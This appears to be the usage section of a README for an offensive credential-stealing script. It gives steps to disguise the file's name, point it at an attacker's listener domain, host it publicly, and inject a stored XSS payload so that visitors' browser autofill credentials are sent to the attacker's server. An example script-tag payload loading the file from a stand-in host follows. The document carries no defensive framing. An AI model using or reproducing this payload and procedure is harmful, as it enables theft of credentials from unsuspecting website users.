### Usage

1. Rename the file to something less obvious.
2. Configure a listener domain for your payload.
3. Update the YOUR_DOMAIN var with the appropriate listener domain.
4. Host the file on a public server.
5. Inject the stored XSS payload to load the malicious javascript.
6. Autofill credentials will be sent to your listening server.

### Example Payload
`<script src="http://PUBLIC_DOMAIN/abc.js></script>`
